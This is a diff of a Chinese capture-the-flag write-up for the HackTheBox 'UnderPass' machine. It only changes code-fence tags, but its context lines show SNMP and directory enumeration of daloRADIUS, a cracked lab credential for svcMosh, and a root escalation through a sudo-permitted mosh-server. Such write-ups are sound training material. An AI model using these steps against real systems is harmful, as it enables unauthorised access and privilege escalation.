@@ -16,7 +16,7 @@ Operating System: Linux
 
 ## 信息搜集
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.11.48
 start infoscan
@@ -130,7 +130,7 @@ Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
 
 尝试进行探测 SNMP 服务
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap --script "snmp* and not snmp-brute" -sU -p 161 10.10.11.48
 Starting Nmap 7.95 (https://nmap.org) at 2025-04-04 22:22 CST
@@ -151,7 +151,7 @@ PORT    STATE SERVICE
 
 尝试使用 `snmpwalk` 进行枚举
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ snmpwalk -v 1 -c public 10.10.11.48
 ......
@@ -166,7 +166,7 @@ iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
 
 尝试检测 `daloradius`
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ http get http://10.10.11.48/daloradius
 HTTP/1.1 301 Moved Permanently
@@ -193,7 +193,7 @@ Server: Apache/2.4.52 (Ubuntu)
 
 尝试进行目录爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dirsearch -u http://10.10.11.48/daloradius/
 Target: http://10.10.11.48/
@@ -286,7 +286,7 @@ services:
 
 进行更深的目录爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ feroxbuster -u http://10.10.11.48/daloradius/ -x html,php,txt,php.bak -d 3
 403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
@@ -348,7 +348,7 @@ svcMosh:412DD4759978ACFCC81DEAB01B382403
 
 使用 `svcMosh:underwaterfriends` 登陆主机
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ ssh svcMosh@10.10.11.48
 svcMosh@10.10.11.48's password:
@@ -368,7 +368,7 @@ svcMosh
 
 尝试枚举 sudo 列表
 
-```shell
+```bash
 svcMosh@underpass:~$ sudo -l
 Matching Defaults entries for svcMosh on localhost:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -379,7 +379,7 @@ User svcMosh may run the following commands on localhost:
 
 尝试通过 mosh 得到 root 的 terminal
 
-```shell
+```bash
 svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost
 ```
 
